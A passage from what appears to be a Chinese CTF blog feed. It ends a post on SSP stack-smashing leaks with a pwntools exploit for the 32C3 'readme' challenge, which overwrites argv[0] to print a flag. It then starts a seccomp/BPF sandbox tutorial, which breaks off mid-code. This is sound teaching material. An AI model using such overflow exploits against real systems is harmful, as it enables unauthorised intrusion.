class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (do_abort, &quot;*** %s ***: terminated\n&quot;, msg);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure><blockquote><p>总结一下原因就是现在不会打印 argv[0] 指针所指向的字符串</p></blockquote><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><strong>32C3 CTF readme</strong></p><p>ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4007E0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Hello!\nWhat&#x27;s your name? &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets(v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;</span>, v3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    byte_600D20[v0++] = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">void</span> *)((<span class="type">int</span>)v0 + <span class="number">0x600D20</span>LL), <span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">32</span> - v0));</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you, bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然<code>_IO_gets(v3)</code>存在溢出</p><p>观察可以得到0x600D20处就是存放flag的地址,但是可以看出无论我们读不读这个地址都会被覆盖</p><p>不过这里有一个知识点:</p><p><strong>在 ELF 内存映射时，bss 段会被映射两次</strong>，所以可以使用另一处的地址来进行输出，可以使用 gdb 的search来进行查找。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search <span class="string">&#x27;Server&#x27;</span></span><br><span class="line">Searching <span class="keyword">for</span> value: <span class="string">&#x27;Server&#x27;</span></span><br><span class="line">bin             <span class="number">0x400d28</span> push rbx <span class="comment">/* &#x27;ServerHasTheFlagHere...&#x27; */</span></span><br><span class="line">bin             <span class="number">0x600d28</span> <span class="string">&#x27;ServerHasTheFlagHere...&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">smash = ELF(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">argv_addr = <span class="number">0x00007fffffffdc58</span></span><br><span class="line">name_addr = <span class="number">0x7fffffffda40</span></span><br><span class="line">flag_addr = <span class="number">0x600D20</span></span><br><span class="line">another_flag_addr = <span class="number">0x400d20</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (argv_addr - name_addr) + p64(another_flag_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;flag: &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">data = sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">rop</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="rop" scheme="https://ixout.github.io/tags/rop/"/>
    
  </entry>
  
  <entry>
    <title>seccomp初识</title>
    <link href="https://ixout.github.io/posts/57317/"/>
    <id>https://ixout.github.io/posts/57317/</id>
    <published>2023-11-04T13:55:04.000Z</published>
    <updated>2024-01-22T14:54:47.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="c沙盒—seccomp"><a href="#c沙盒—seccomp" class="headerlink" title="c沙盒—seccomp"></a>c沙盒—seccomp</h1><p>seccomp(全称securecomputing mode)是linux kernel支持的一种安全机制。在Linux系统里，大量的系统调用(systemcall)直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。通过seccomp，我们限制程序使用某些系统调用，这样可以减少系统的暴露面，同时是程序进入一种“安全”的状态。</p><p>linux中一般使用seccomp有两种方法，一种是<strong>prctl</strong>，另一种是用<strong>seccomp</strong></p><p>ctf中使用沙箱一般都会禁用execve函数，使之无法直接getshell</p><p><strong>seccomp函数本身会申请chunk，所以堆块结构初始会有一些不同,也就是一些师傅说的影响堆的风水</strong></p><p>主要是seccomp_rule_add和seccomp_load这两个函数影响了tcache和fastbin的风水。</p><p><strong>prctl则不会</strong></p><h2 id="Seccomp-的发展历史"><a href="#Seccomp-的发展历史" class="headerlink" title="Seccomp 的发展历史"></a>Seccomp 的发展历史</h2><p>2005年，Linux 2.6.12中的引入了第一个版本的seccomp，通过向<code>/proc/PID/seccomp</code>接口中写入“1”来启用过滤器，最初只有一个模式：严格模式（strict mode），该模式下只允许被限制的进程使用4种系统调用：<em>read()</em>, <em>write()</em>, <em>_exit()</em>, 和 <em>sigreturn()</em> ，需要注意的是，<code>open()</code>系统调用也是被禁止的，这就意味着在进入严格模式之前必须先打开文件。一旦为程序施加了严格模式的seccomp，对于其他的所有系统调用的调用，都会触发<code>SIGKILL</code>并立即终止进程。</p><p>2007年，Linux 2.6.23 内核使用<code>prctl（）</code>操作代替了<code>/proc/PID/seccomp</code>接口来施加seccomp，通过<code>Prctl (PR_SET_SECCOMP,arg)</code>修改调用者的seccomp模式；<code>prctl(PR_GET_SECCOMP)</code>用来获取seccomp的状态，返回值为0时代表进程没有被施加seccomp，但是如果进程配置了seccomp，则会由于不能调用<code>prctl(）</code>导致进程中止，那就没有其他返回值了？？</p><p>2012年，Linux 3.5引入了”seccomp mode 2“，为seccomp带来了一种新的模式：过滤模式（ filter mode ）， 该模式使用 Berkeley 包过滤器 (BPF) 程序过滤任意系统调用及其参数,使用该模式，进程可以使用 <code>prctl (PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)</code>来指定允许哪些系统调用。 现在已经有许多应用使用 seccomp 过滤器来对系统调用进行控制，包括 Chrome/Chromium 浏览器、OpenSSH、vsftpd 和 Firefox OS 。</p><p>2013年，Linux 3.8版本，在<code>/proc/PID/status</code>中添加了一个Seccomp字段， 可以通过读取该文件获取对应进程的 seccomp 模式的状态（0 表示禁用，1 表示严格，2 表示过滤）。</p><p>2014年，Linux 3.17 引入了<code>seccomp()</code>系统调用，<code>seccomp()</code>在<code>prctl()</code>的基础上提供了现有功能的超集， 增加了将进程中的所有线程同步到同一组过滤器的能力，这有助于确保即使在施加seccomp过滤器之前创建的线程仍然有效。</p><h2 id="原理BPF"><a href="#原理BPF" class="headerlink" title="原理BPF"></a>原理BPF</h2><p>BPF即伯克利包过滤器(Berkeley Packets Filter)</p><p>BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p><p>以下更多介绍其在CTF沙盒中的使用</p><p>以禁用execve函数的规则为例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sock_filter</span> filter[] = &#123;</span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>), <span class="comment">//前面两步用于检查arch</span></span><br><span class="line"><span class="built_in">BPF_JUMP</span>(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),</span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),    <span class="comment">//将帧的偏移0处，取4个字节数据，也就是系统调用号的值载入累加器</span></span><br><span class="line"><span class="built_in">BPF_JUMP</span>(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),    <span class="comment">//当A == 59时，顺序执行下一条规则，否则跳过下一条规则，这里的59就是x64的execve系统调用</span></span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_RET+BPF_K,SECCOMP_RET_KILL),     <span class="comment">//返回KILL</span></span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),    <span class="comment">//返回ALLOW</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在linux/filter.h中找到结构体和宏指令，BPF的过滤规则就是由两个指令宏组成的指令序列完成的，这个序列是一个结构体数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *    Try and keep these values and structures similar to BSD, especially</span></span><br><span class="line"><span class="comment"> *    the BPF code definitions which need to match so you can share filters</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sock_filter</span> &#123;    <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16    code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">    __u8    jt;    <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8    jf;    <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32    k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sock_fprog</span> &#123;    <span class="comment">/* Required for SO_ATTACH_FILTER. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>        len;    <span class="comment">/* Number of filter blocks */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> __user *filter;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ret - BPF_K and BPF_X also apply */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RVAL(code)  ((code) &amp; 0x18)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>         BPF_A           0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* misc */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MISCOP(code) ((code) &amp; 0xf8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>         BPF_TAX         0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>         BPF_TXA         0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Macros for filter block array initializers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_STMT<span class="comment">//一般执行加载指令</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_JUMP<span class="comment">//一般执行判断跳转和返回指令</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>在linux/seccomp.h中存在用于BPF_STMT的结构体,</strong>BPF_STMT的第二个参数一般就是根据这个定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line"><span class="type">int</span> nr;<span class="comment">//系统调用号</span></span><br><span class="line">__u32 arch;<span class="comment">//架构</span></span><br><span class="line">__u64 instruction_pointer;</span><br><span class="line">__u64 args[<span class="number">6</span>];<span class="comment">//参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在linux/bpf_common.h中有BPF_STMT和BPF_JUMP这两个操作指令参数的介绍</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)            <span class="comment">//首先指定操作的类别</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LD        0x00                                        <span class="comment">//将操作数装入A或者X</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LDX        0x01                   </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ST        0x02                                        <span class="comment">//拷贝A或X的值到内存</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_STX        0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ALU        0x04                                        <span class="comment">//用X或常数作为操作数在累加器上执行算数或逻辑运算</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JMP        0x05                                        <span class="comment">//跳转指令</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RET        0x06                                        <span class="comment">//终止过滤器并表明报文的哪一部分保留下来，如果返回0，报文全部被丢弃</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MISC     0x07</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ld/ldx fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="comment">//在ld时指定操作数的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_W        0x00                <span class="comment">//双字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_H        0x08                <span class="comment">//单字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_B        0x10                <span class="comment">//单字节</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="comment">//操作数类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IMM        0x00  <span class="comment">//立即数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ABS        0x20                        <span class="comment">//绝对偏移                   </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IND        0x40                        <span class="comment">//相对偏移</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MEM        0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LEN        0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MSH        0xa0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* alu/jmp fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="comment">//当操作码类型为ALU时，指定具体运算符</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ADD        0x00                    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_SUB        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MUL        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_DIV        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_OR        0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_AND        0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LSH        0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RSH        0x70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_NEG        0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MOD        0x90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_XOR        0xa0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JA        0x00                    <span class="comment">//当操作码类型是JMP时指定跳转类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JEQ        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGT        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGE        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JSET        0x40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)        </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_K        0x00                    <span class="comment">//常数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_X        0x08</span></span><br></pre></td></tr></table></figure><p>一条指令包含多个部分,只需要按照结构体去创建规则就可以使用它，可以有多条过滤规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。</p><p><strong>以较为常见的指令为例:</strong></p><p><strong><code>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,x)</code>从BPF_STMT结构体的绝对偏移x处开始加载四个字节到寄存器</strong></p><p><strong><code>BPF_JUMP(BPF_JMP+BPF_JEQ,x,a,b)</code>如果此时寄存器中的值与x相等,则跳过之后的a行代码,如果不等,则跳过之后的b行代码</strong></p><p>此外还有对寄存器中数操作的AUL操作</p><p>当然BPF还能实现更多更高级的功能,可以深入研究</p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>有两个系统调用与 seccomp 有关，一个是<code>prctl</code>，另一个是<code>seccomp</code>，系统调用号分别为 157 和 317，对应的内核函数为<code>sys_prctl</code>和<code>sys_seccomp</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(seccomp, <span class="type">unsigned</span> <span class="type">int</span>, op, <span class="type">unsigned</span> <span class="type">int</span>, flags,</span><br><span class="line"> <span class="type">void</span> __user *, uargs)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> do_seccomp(op, flags, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get/set process seccomp mode */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NO_NEW_PRIVS39</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> PR_GET_SECCOMP:</span><br><span class="line">            error = prctl_get_seccomp();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PR_SET_SECCOMP:</span><br><span class="line">            error = prctl_set_seccomp(arg2, (<span class="type">char</span> __user *)arg3);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_DISABLED0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">prctl_set_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode, <span class="type">void</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line"><span class="type">void</span> __user *uargs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (seccomp_mode) &#123;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">op = SECCOMP_SET_MODE_STRICT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Setting strict mode through prctl always ignored filter,</span></span><br><span class="line"><span class="comment"> * so make sure it is always NULL here to pass the internal</span></span><br><span class="line"><span class="comment"> * check in do_seccomp().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">uargs = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">op = SECCOMP_SET_MODE_FILTER;</span><br><span class="line">uargs = filter;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* prctl interface doesn&#x27;t have flags, so they are always zero. */</span></span><br><span class="line"><span class="keyword">return</span> do_seccomp(op, <span class="number">0</span>, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果将<code>prctl</code>系统调用的第一个参数设置为<code>PR_SET_SECCOMP</code>，最终调用的与<code>sys_seccomp</code>相同，都是<code>do_seccomp</code>。这也是设置<code>seccomp</code>规则的入口函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Common entry point for both prctl and syscall. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> op, <span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span 